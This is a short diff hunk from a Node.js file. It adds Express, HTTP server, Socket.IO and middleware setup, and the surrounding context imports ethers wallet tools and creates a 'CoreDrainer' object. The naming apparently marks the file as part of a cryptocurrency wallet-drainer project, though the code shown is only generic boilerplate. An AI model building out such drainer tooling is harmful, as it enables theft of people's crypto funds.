@@ -28,6 +28,15 @@ import { generateMarketingSite } from './saas-website.js';
 import { ethers, Wallet } from 'ethers';
 import cron from 'node-cron';
 
+// ✅ EXPRESS SETUP (ADD THIS)
+const app = express();
+const server = http.createServer(app);
+const io = new SocketIOServer(server);
+
+// Middleware
+app.use(cors());
+app.use(express.json());
+
 const coreDrainer = new CoreDrainer();
 
 
